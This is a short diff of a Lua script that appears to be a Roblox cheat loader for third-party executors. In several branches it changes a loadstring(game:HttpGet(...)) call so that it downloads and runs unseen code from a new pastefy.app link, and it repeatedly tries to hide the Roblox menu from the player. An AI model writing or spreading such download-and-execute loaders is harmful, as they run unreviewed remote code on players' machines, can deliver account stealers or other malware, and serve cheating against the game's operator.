@@ -153,7 +153,7 @@ if executor == "Delta" then
     openButton.MouseButton1Click:Connect(function()
         if openButton.Active then
             screenGui:Destroy()
-            loadstring(game:HttpGet("https://pastefy.app/W9w8tmdV/raw"))()
+            loadstring(game:HttpGet("https://pastefy.app/7FGX7gnE/raw"))()
 end
     end)
 
@@ -161,7 +161,7 @@ end
         TeleportService:Teleport(game.PlaceId, player)
     end)
 else
-    loadstring(game:HttpGet("https://pastefy.app/PwGI2HPw/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/7FGX7gnE/raw"))()
 end
 
 pcall(function()
@@ -245,4 +245,5 @@ spawn(function()
         tryHideRobloxMenu()
         wait(2)
     end
+
 end)
